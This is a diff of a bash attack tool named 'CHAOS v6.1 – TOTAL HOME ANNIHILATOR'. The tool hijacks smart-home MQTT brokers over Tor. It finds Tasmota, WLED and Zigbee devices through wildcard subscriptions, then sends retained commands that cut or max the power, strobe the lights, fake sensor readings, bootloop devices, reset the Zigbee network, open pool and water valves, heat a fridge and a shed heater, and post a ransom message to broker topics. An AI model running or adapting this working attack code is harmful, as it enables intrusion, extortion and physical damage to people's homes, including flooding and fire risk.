@@ -1,5 +1,5 @@
 #!/bin/bash
-# CHAOS v6.1 - TOTAL HOME ANNIHILATOR - FIXED DISCOVERY # WILDCARD
+# CHAOS v6.1 - TRUSTEDF57 TOTAL HOME ANNIHILATOR - FIXED
 set -euo pipefail
 
 # TARGET SYSTEM
@@ -10,96 +10,76 @@ TOR="torsocks"
 MAX_TEMP="50"
 MAX_HUMID="99"
 MAX_BRIGHT="255"
-CHAOS_STATUS="TOTAL-ANNIHILATION"
-RANSOM_MSG="TOTAL HOME TAKEOVER"
+CHAOS_STATUS="TRUSTEDF57-TOTAL-ANNIHILATION"
+RANSOM_MSG="💀 TRUSTEDF57 TOTAL HOME TAKEOVER 💀"
 
-ENCRYPT_PAYLOAD() {
+encrypt_payload() {
     echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-I-FUCKED-MARTHA-ROOT" 2>/dev/null | sed 's/=//g'
 }
 
-TOR_PUB() {
+tor_pub() {
     local topic=$1 payload=$2 qos=2
-    if [[ $# -eq 3 ]]; then
-        qos=$3
-    fi
+    [[ $# -eq 3 ]] && qos=$3
     ${TOR} mosquitto_pub -h "${HOST}" -p "${PORT}" -r -q "$qos" -t "$topic" -m "$payload" >/dev/null 2>&1
 }
 
 discover_all() {
     echo "[🔍] FULL DISCOVERY ${HOST}:${PORT} (45s)..."
-    
-    # CAPTURE # WILDCARD FLOOD PROPERLY
     rm -f "chaos_all.txt"
     
-    # Use -v for topic+payload + pipe properly
     ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" -v | \
     timeout 45 head -n 5000 | \
-    awk '
-    {
-        # Extract topic (before :) and device name
+    awk '{
         topic = $1
         if (topic ~ /Tasmota|wled|zigbee2mqtt|temp|humid|Garage|Garden|Shed|Pool|Fridge/i) {
-            # Extract device name from topic
             gsub(/^.*\//, "", topic)
             gsub(/\/.*$/, "", topic)
-            if (topic != "" && length(topic) > 1 && length(topic) < 50) {
-                print topic
-            }
+            if (topic != "" && length(topic) > 1 && length(topic) < 50) print topic
         }
-    }' | \
-    sort -u > "chaos_all.txt"
+    }' | sort -u > "chaos_all.txt"
     
-    # FORCE COUNT EVEN IF EMPTY
     if [[ -f "chaos_all.txt" ]]; then
         COUNT=$(grep -c . "chaos_all.txt" 2>/dev/null || echo "0")
-        if [[ $COUNT -eq 0 ]]; then
-            echo "📋 TOTAL DEVICES: 0 (no matching devices found)"
-        else
-            echo "📋 TOTAL DEVICES: ${COUNT}"
-            echo "[DEBUG] First 5 devices:"
-            head -5 "chaos_all.txt"
-        fi
+        echo "📋 TOTAL DEVICES: ${COUNT}"
+        [[ $COUNT -gt 0 ]] && echo "[DEBUG] First 5:" && head -5 "chaos_all.txt"
     else
         COUNT="0"
         touch "chaos_all.txt"
-        echo "📋 TOTAL DEVICES: 0"
     fi
     
     load_all
-    echo "[✅] Discovery complete - ${#ALL_DEVICES[@]} devices ready"
+    echo "[✅] ${#ALL_DEVICES[@]} devices ready"
 }
 
 load_all() {
     ALL_DEVICES=()
-    if [[ -f "chaos_all.txt" && -s "chaos_all.txt" ]]; then
-        mapfile -t ALL_DEVICES < "chaos_all.txt"
-    fi
+    [[ -f "chaos_all.txt" && -s "chaos_all.txt" ]] && mapfile -t ALL_DEVICES < "chaos_all.txt"
 }
 
 show_menu() {
     clear
     COUNT=${#ALL_DEVICES[@]}
     cat << EOF
-┌─ TRUSTEDF57 - ${HOST}:${PORT} (${COUNT} TOTAL DEVICES) ─┐
-│ 1)  FULL SYSTEM DISCOVERY (45s)                     │
-│ 2)   TEMP 50°C + 💧 HUMIDITY 99% (ALL SENSORS)      │
-│ 3)  STROBE LIGHTS + MAX BRIGHT (Tasmota/WLED)       │
-│ 4)  ALL POWER OFF                                   │
-│ 5)  ALL POWER ON + MAX 255                          │
-│ 6)  RAINBOW + MATRIX DISCO (WLED)                   │
-│ 7) BOOTLOOP Tasmota + Zigbee Flood                 │
-│ 8)  BROKER + Z2M RANSOM OVERWRITE                   │
-│ 9)  VALVES + POOL + FRIDGE CHAOS                    │
-│ 0)  TOTAL HOME ANNIHILATION v6.1                    │
-│ D)  SHOW DEVICES LIST                               │
-│ X)  EXIT                                            │
-└───────────────────────────────────────────────────────┘
+┌─ TRUSTEDF57 - ${HOST}:${PORT} (${COUNT} DEVICES) ─┐
+│ 1)  FULL DISCOVERY (45s)                        │
+│ 2)  🌡️ TEMP 50°C + 💧 99% SENSORS               │
+│ 3)  💡 STROBE + MAX LIGHTS                      │
+│ 4)  🔴 ALL POWER OFF                            │
+│ 5)  🟢 ALL POWER ON + 255                       │
+│ 6)  🎪 RAINBOW DISCO WLED                       │
+│ 7)  💥 BOOTLOOP + ZIGBEE FLOOD                  │
+│ 8)  🔒 BROKER RANSOM                            │
+│ 9)  🏠 POOL/VALVES/FRIDGE                       │
+│ 0)  🎯 TOTAL ANNIHILATION v6.1                  │
+│ D)  📋 SHOW DEVICES                             │
+│ X)  ❌ EXIT                                     │
+└─────────────────────────────────────────────────┘
 EOF
 }
 
 check_loaded() {
     [[ ${#ALL_DEVICES[@]} -eq 0 ]] && { 
-        echo "❌ No devices! Run 1) DISCOVERY first"
+        echo "❌ Run 1) DISCOVERY first"
         sleep 2
         return 1
     }
@@ -107,132 +87,121 @@ check_loaded() {
 }
 
 show_devices() {
-    if [[ ${#ALL_DEVICES[@]} -eq 0 ]]; then
-        echo "❌ No devices loaded"
-        return 1
-    fi
-    echo "📋 ALL DEVICES (${#ALL_DEVICES[@]}):"
+    [[ ${#ALL_DEVICES[@]} -eq 0 ]] && { echo "❌ No devices"; return 1; }
+    echo "📋 DEVICES (${#ALL_DEVICES[@]}):"
     printf '%s\n' "${ALL_DEVICES[@]}" | head -20
-    echo "... (showing first 20)"
+    echo "... (first 20)"
 }
 
 max_temp_humidity() {
     check_loaded || return 1
-    echo "[🌡️💧] MAX TEMP 50°C + HUMIDITY 99% on ${#ALL_DEVICES[@]} devices..."
+    echo "[🌡️💧] MAX TEMP/HUMIDITY..."
     
-    TOR_PUB "zigbee2mqtt/bridge/request/devices"
-    TOR_PUB "zigbee2mqtt/#" '{"temperature": 50, "humidity": 99}'
+    tor_pub "zigbee2mqtt/bridge/request/devices"
+    tor_pub "zigbee2mqtt/#" '{"temperature": 50, "humidity": 99}'
     
     for dev in "${ALL_DEVICES[@]}"; do
-        TOR_PUB "zigbee2mqtt/${dev}/set" '{"temperature": 50, "humidity": 99}'
-        TOR_PUB "zigbee2mqtt/${dev}" '{"temperature": 50, "humidity": 99, "status": "CHAOS"}'
+        tor_pub "zigbee2mqtt/${dev}/set" '{"temperature": 50, "humidity": 99}'
+        tor_pub "zigbee2mqtt/${dev}" '{"temperature": 50, "humidity": 99, "status": "CHAOS"}'
     done
     
-    TOR_PUB "climate/#" '{"temperature": 50, "humidity": 99}'
-    TOR_PUB "sensor/Fridge/state" "50.0°C 99%"
-    echo "✅ Sensors MAXED"
+    tor_pub "climate/#" '{"temperature": 50, "humidity": 99}'
+    tor_pub "sensor/Fridge/state" "50.0°C 99%"
+    echo "✅ SENSORS MAXED"
 }
 
 lights_strobe_max() {
     check_loaded || return 1
-    echo "[💡] LIGHTS STROBE + MAX 255..."
+    echo "[💡] LIGHTS STROBE MAX..."
     count=0
     for dev in "${ALL_DEVICES[@]}"; do
-        if [[ $dev == Tasmota* || $dev == wled* || $dev == *light* ]]; then
-            TOR_PUB "${dev}/cmnd/Power" "1"
-            TOR_PUB "${dev}/cmnd/Bri" "255"
-            TOR_PUB "${dev}/POWER" "TOGGLE"
-            ((count++))
-        fi
+        [[ $dev == Tasmota* || $dev == wled* || $dev == *light* ]] || continue
+        tor_pub "${dev}/cmnd/Power" "1"
+        tor_pub "${dev}/cmnd/Bri" "255"
+        tor_pub "${dev}/POWER" "TOGGLE"
+        ((count++))
     done
-    echo "✅ ${count} Lights MAXED"
+    echo "✅ ${count} LIGHTS"
 }
 
 power_off_all() {
     check_loaded || return 1
-    echo "[🔴] TOTAL POWER OFF..."
+    echo "[🔴] POWER OFF..."
     for dev in "${ALL_DEVICES[@]}"; do
-        TOR_PUB "${dev}/cmnd/Power" "0"
-        TOR_PUB "${dev}/POWER" "OFF"
-        TOR_PUB "${dev}/set" '{"state": "OFF"}'
+        tor_pub "${dev}/cmnd/Power" "0"
+        tor_pub "${dev}/POWER" "OFF"
+        tor_pub "${dev}/set" '{"state": "OFF"}'
     done
     echo "✅ OFF"
 }
 
 power_max_all() {
     check_loaded || return 1
-    echo "[🟢] TOTAL POWER ON + 255..."
+    echo "[🟢] POWER ON MAX..."
     for dev in "${ALL_DEVICES[@]}"; do
-        TOR_PUB "${dev}/cmnd/Power" "1"
-        TOR_PUB "${dev}/POWER" "ON"
-        TOR_PUB "${dev}/cmnd/Bri" "255"
-        TOR_PUB "${dev}/set" '{"state": "ON", "brightness": 255}'
+        tor_pub "${dev}/cmnd/Power" "1"
+        tor_pub "${dev}/POWER" "ON"
+        tor_pub "${dev}/cmnd/Bri" "255"
+        tor_pub "${dev}/set" '{"state": "ON", "brightness": 255}'
     done
-    echo "✅ MAX POWER"
+    echo "✅ MAX"
 }
 
 disco_chaos() {
     check_loaded || return 1
-    echo "[🎪] RAINBOW MATRIX DISCO..."
+    echo "[🎪] DISCO..."
     disco_fx="fx 38;sx 255;ix 255;bri 255;col 255,0,255"
     count=0
     for dev in "${ALL_DEVICES[@]}"; do
-        if [[ $dev == wled* ]]; then
-            TOR_PUB "wled/${dev}/backlog" "${disco_fx}"
-            ((count++))
-        fi
+        [[ $dev == wled* ]] || continue
+        tor_pub "wled/${dev}/backlog" "${disco_fx}"
+        ((count++))
     done
-    echo "✅ ${count} Disco devices ON"
+    echo "✅ ${count} DISCO"
 }
 
 bootloop_flood() {
     check_loaded || return 1
-    echo "[💥] BOOTLOOP + ZIGBEE FLOOD..."
-    
+    echo "[💥] BOOTLOOP..."
     bootloop="Power1;Delay 400;Power0;Delay 200;Power1;Delay 800;LOOP"
     count=0
     for dev in "${ALL_DEVICES[@]}"; do
-        if [[ $dev == Tasmota* ]]; then
-            TOR_PUB "Tasmota/${dev}/cmnd/Backlog" "${bootloop}"
-            ((count++))
-        fi
+        [[ $dev == Tasmota* ]] || continue
+        tor_pub "Tasmota/${dev}/cmnd/Backlog" "${bootloop}"
+        ((count++))
     done
-    
-    TOR_PUB "zigbee2mqtt/bridge/request/network/reset" '{"force": true}'
-    TOR_PUB "zigbee2mqtt/bridge/request/lan/action" '{"action": "permit_join", "duration": 65535}'
-    echo "✅ ${count} Bootloop + Zigbee Flood"
+    tor_pub "zigbee2mqtt/bridge/request/network/reset" '{"force": true}'
+    tor_pub "zigbee2mqtt/bridge/request/lan/action" '{"action": "permit_join", "duration": 65535}'
+    echo "✅ ${count} BOOTLOOP"
 }
 
 broker_ransom() {
-    echo "[🔒] TOTAL RANSOM..."
+    echo "[🔒] RANSOM..."
     ransom_data="{\"status\":\"${CHAOS_STATUS}\",\"temp\":${MAX_TEMP},\"humid\":${MAX_HUMID},\"brightness\":${MAX_BRIGHT}}"
-    crypt_data=$(ENCRYPT_PAYLOAD "${ransom_data}")
+    crypt_data=$(encrypt_payload "${ransom_data}")
     
-    TOR_PUB "\$SYS/brokers/${HOST}/sysdescr" "${RANSOM_MSG}"
-    TOR_PUB "\$SYS/brokers/${HOST}/version" "${crypt_data}"
-    TOR_PUB "zigbee2mqtt/bridge/state" "${crypt_data}"
-    TOR_PUB "homeassistant/status" "CHAOS-TOTAL"
-    echo "✅ Ransomed"
+    tor_pub "\$SYS/brokers/${HOST}/sysdescr" "${RANSOM_MSG}"
+    tor_pub "\$SYS/brokers/${HOST}/version" "${crypt_data}"
+    tor_pub "zigbee2mqtt/bridge/state" "${crypt_data}"
+    tor_pub "homeassistant/status" "TRUSTEDF57"
+    echo "✅ RANSOM"
 }
 
 valves_pool_chaos() {
     check_loaded || return 1
-    echo "[🏠] POOL/VALVES/FRIDGE CHAOS..."
-    
-    TOR_PUB "zigbee2mqtt/Pool Valve/set" '{"state": "ON"}'
-    TOR_PUB "zigbee2mqtt/Water Valve/set" '{"state": "ON"}'
-    TOR_PUB "zigbee2mqtt/Fridge/set" '{"temperature": 50}'
-    TOR_PUB "Pool - 0xa4c13801669cffff/set" '{"state": "ON"}'
-    
-    TOR_PUB "Tasmota/Garage_Lights_1/cmnd/Power" "1"
-    TOR_PUB "Tasmota/shed-heater/cmnd/Power" "1"
-    echo "✅ Valves/Pool MAX"
+    echo "[🏠] POOL/VALVES..."
+    tor_pub "zigbee2mqtt/Pool Valve/set" '{"state": "ON"}'
+    tor_pub "zigbee2mqtt/Water Valve/set" '{"state": "ON"}'
+    tor_pub "zigbee2mqtt/Fridge/set" '{"temperature": 50}'
+    tor_pub "Pool - 0xa4c13801669cffff/set" '{"state": "ON"}'
+    tor_pub "Tasmota/Garage_Lights_1/cmnd/Power" "1"
+    tor_pub "Tasmota/shed-heater/cmnd/Power" "1"
+    echo "✅ VALVES"
 }
 
 total_annihilation_v61() {
     check_loaded || return 1
-    echo "🎯 TOTAL HOME ANNIHILATION v6.1 STARTING..."
-    
+    echo "🎯 TOTAL ANNIHILATION..."
     power_off_all; sleep 1
     max_temp_humidity; sleep 2
     power_max_all; sleep 2
@@ -241,19 +210,18 @@ total_annihilation_v61() {
     bootloop_flood; sleep 2
     broker_ransom; sleep 2
     valves_pool_chaos
-    
-    echo "💀🏠 TOTAL ANNIHILATION COMPLETE! 💀"
+    echo "💀🏠 COMPLETE 💀"
 }
 
-# MAIN LOOP
+# MAIN
 ALL_DEVICES=()
 clear
-echo "💀 CHAOS v6.1 - ${HOST}:${PORT} - TOTAL HOME DESTRUCTION"
+echo "💀 TRUSTEDF57 CHAOS v6.1 - ${HOST}:${PORT}"
 
 while true; do
     show_menu
-    read -r -t 30 CHOICE || CHOICE=""
-    case "${CHOICE}" in
+    read -r -t 30 choice || choice=""
+    case "${choice}" in
         1) discover_all ;;
         2) max_temp_humidity ;;
         3) lights_strobe_max ;;
@@ -265,9 +233,9 @@ while true; do
         9) valves_pool_chaos ;;
         0) total_annihilation_v61 ;;
         [Dd]) show_devices ;;
-        [Xx]|[Qq]) echo "EXIT CHAOS"; exit 0 ;;
-        *) echo "❌ ${CHOICE} invalido - try 1=DISCOVERY, D=SHOW DEVICES" ;;
+        [Xx]|[Qq]) echo "EXIT"; exit 0 ;;
+        *) echo "❌ ${choice} - 1=DISCOVERY D=DEVICES" ;;
     esac
     echo
-    read -p "⏸️  ENTER per continuare... (X=exit)" || true
+    read -p "ENTER to continue... (X=exit)" || true
 done
